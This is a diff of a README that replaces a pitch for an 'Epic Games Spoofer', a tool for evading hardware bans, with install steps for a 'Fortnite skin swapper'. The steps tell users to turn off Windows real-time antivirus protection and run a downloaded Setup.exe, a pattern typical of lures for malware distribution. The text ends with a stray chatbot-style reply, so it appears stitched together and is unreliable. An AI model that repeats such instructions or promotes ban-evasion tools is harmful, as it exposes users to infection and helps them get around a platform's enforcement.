@@ -1,6 +1,28 @@
-# epicgamesSpoofer
-this will help if u are hardware banned by epic games
+how to use
+Fn Skin swapper
 
-The Epic Games Spoofer is a powerful tool specifically designed to mask or alter system identifiers, such as hardware IDs (HWIDs), which are commonly used by platforms like Epic Games to enforce bans. When a hardware ban is applied, it targets key components of your system—like your motherboard, GPU, or network card—by logging their unique identifiers.
 
-With the Epic Games Spoofer, these identifiers are temporarily or permanently changed, effectively "tricking" the platform into recognizing your system as completely new. This renders hardware bans ineffective, allowing you to access Epic Games services without restrictions. Whether you're hardware banned or simply want added protection, the Epic Games Spoofer ensures you can game freely without interruption.
+How to Use FN Skin Swapper
+Disable Real-Time Protection
+
+Open Windows Security.
+Go to Virus & Threat Protection.
+Turn off Real-Time Protection (This may be necessary as some programs are flagged as false positives).
+Download the Program
+
+Click on the provided Code button.
+Select Download ZIP.
+Once downloaded, right-click the ZIP file and choose Extract All to a folder on your PC.
+Run the Setup
+
+Open the extracted folder.
+Double-click on the Setup.exe file to start the installation process.
+Follow the on-screen instructions to complete the setup.
+Launch FN Skin Swapper
+
+After installation, open FN Skin Swapper from your desktop or installation directory.
+Follow any on-screen prompts to swap skins in Fortnite.
+Disclaimer
+Using third-party software to modify Fortnite files may violate Epic Games’ Terms of Service and result in an account ban. Always proceed with caution when using external programs.
+
+If this is for an educational project, you might want to focus on how software installations work rather than the specifics of modifying game files. Let me know if you need help with that!
